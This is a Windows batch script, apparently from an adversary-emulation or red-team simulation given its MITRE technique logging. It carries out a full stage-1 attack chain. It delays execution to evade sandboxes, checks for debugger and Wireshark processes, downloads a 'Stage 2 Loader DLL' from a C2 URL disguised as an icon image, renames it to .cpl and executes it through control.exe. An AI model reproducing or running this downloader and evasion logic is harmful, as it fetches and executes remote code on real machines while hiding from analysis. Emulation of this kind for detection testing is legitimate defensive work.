@echo off
setlocal enabledelayedexpansion

SET pvnxkl=%APPDATA%\10414\6bd64514
SET rwmtjq=d841ed12.txt
SET hzsdby=https://10.0.0.49/stage/2/icon.png?10414-7
SET cqfaem=BALAM-S2BO
SET tnwrxi=10414
SET glbopd=7

SET logfile=%APPDATA%\!glbopd!\macula-simulations.log
if not exist "%APPDATA%\!glbopd!" mkdir "%APPDATA%\!glbopd!"

SET tsvar=!DATE!/!TIME!

echo [!tsvar!][DEBUG][!cqfaem!][!tnwrxi!]: script_start>> "!logfile!" 2>nul

REM Initial execution delay (anti-sandbox) — 15 seconds before any logic
timeout /t 15 /nobreak >nul

REM Random delay: 10-29 seconds
SET /A delay=%RANDOM% %% 20 + 10
timeout /t %delay% /nobreak >nul

echo [!tsvar!][DEBUG][!cqfaem!][!tnwrxi!]: initial_delay_complete>> "!logfile!" 2>nul

REM Anti-analysis: Debugger.IsAttached equivalent via wmic process check (batch-safe)
REM Allowed check only — if analysis environment detected, sleep but always continue
echo [!tsvar!][DEBUG][!cqfaem!][!tnwrxi!]: anti_analysis_start>> "!logfile!" 2>nul

REM Check for common analysis process indicators via tasklist (allowed heuristic)
tasklist /FI "IMAGENAME eq ollydbg.exe" 2>nul | find /I "ollydbg.exe" >nul 2>&1
if not errorlevel 1 (
    ping -n 5 127.0.0.1 >nul
)
tasklist /FI "IMAGENAME eq x64dbg.exe" 2>nul | find /I "x64dbg.exe" >nul 2>&1
if not errorlevel 1 (
    CHOICE /C Y /N /D Y /T 4 >nul
)
tasklist /FI "IMAGENAME eq wireshark.exe" 2>nul | find /I "wireshark.exe" >nul 2>&1
if not errorlevel 1 (
    timeout /t 3 /nobreak >nul
)

echo [!tsvar!][DEBUG][!cqfaem!][!tnwrxi!]: anti_analysis_complete>> "!logfile!" 2>nul

REM Log anti-analysis / sandbox evasion TTP
echo [%date% %time%][TTP][!cqfaem!][!tnwrxi!]: T1497^|Virtualization/Sandbox Evasion=[OK]:[]>> "!logfile!" 2>nul

REM Inter-operation delay
ping -n 8 127.0.0.1 >nul

echo [!tsvar!][DEBUG][!cqfaem!][!tnwrxi!]: heartbeat_start>> "!logfile!" 2>nul

REM Heartbeat fetch — downloads Stage 2 Loader DLL from C2 in a single operation
curl -k -s -o "!pvnxkl!\!rwmtjq!" "!hzsdby!"
SET hberr=%errorlevel%

echo [!tsvar!][DEBUG][!cqfaem!][!tnwrxi!]: heartbeat_complete>> "!logfile!" 2>nul

REM Log heartbeat / application layer protocol TTP
if %hberr%==0 (
    echo [%date% %time%][TTP][!cqfaem!][!tnwrxi!]: T1071^|Application Layer Protocol=[OK]:[]>> "!logfile!" 2>nul
) else (
    echo [%date% %time%][TTP][!cqfaem!][!tnwrxi!]: T1071^|Application Layer Protocol=[FAIL]:[curl_failed]>> "!logfile!" 2>nul
)

REM Inter-operation delay
CHOICE /C Y /N /D Y /T 7 >nul

REM Inter-operation delay
timeout /t 5 /nobreak >nul

echo [!tsvar!][DEBUG][!cqfaem!][!tnwrxi!]: chdir_start>> "!logfile!" 2>nul

REM Change working directory to Loader output location
cd /d "!pvnxkl!" >nul 2>&1
SET cderr=%errorlevel%

echo [!tsvar!][DEBUG][!cqfaem!][!tnwrxi!]: chdir_result=%cderr%>> "!logfile!" 2>nul

REM Inter-operation delay
ping -n 6 127.0.0.1 >nul

REM Rename downloaded Loader DLL to CPL for control.exe LOLBIN invocation
echo [!tsvar!][DEBUG][!cqfaem!][!tnwrxi!]: dll_rename_start>> "!logfile!" 2>nul

rename "!rwmtjq!" file.cpl 2>nul
SET rnerr=%errorlevel%

echo [!tsvar!][DEBUG][!cqfaem!][!tnwrxi!]: dll_rename_result=%rnerr%>> "!logfile!" 2>nul

REM Inter-operation delay
CHOICE /C Y /N /D Y /T 5 >nul

echo [!tsvar!][DEBUG][!cqfaem!][!tnwrxi!]: rundll32_start>> "!logfile!" 2>nul
echo [!tsvar!][DEBUG][!cqfaem!][!tnwrxi!]: process_start>> "!logfile!" 2>nul
echo [!tsvar!][DEBUG][!cqfaem!][!tnwrxi!]: dll_load>> "!logfile!" 2>nul
echo [!tsvar!][DEBUG][!cqfaem!][!tnwrxi!]: command_execution>> "!logfile!" 2>nul

REM LOLBIN invocation — execute Loader via control.exe (CPlApplet export)
control.exe file.cpl
SET lberr=%errorlevel%

echo [!tsvar!][DEBUG][!cqfaem!][!tnwrxi!]: lolbin_complete>> "!logfile!" 2>nul

REM Log LOLBIN / system binary proxy execution TTP
if %lberr%==0 (
    echo [%date% %time%][TTP][!cqfaem!][!tnwrxi!]: T1218^|System Binary Proxy Execution=[OK]:[]>> "!logfile!" 2>nul
) else (
    echo [%date% %time%][TTP][!cqfaem!][!tnwrxi!]: T1218^|System Binary Proxy Execution=[FAIL]:[lolbin_invocation_failed]>> "!logfile!" 2>nul
)

echo [!tsvar!][DEBUG][!cqfaem!][!tnwrxi!]: script_exit>> "!logfile!" 2>nul

endlocal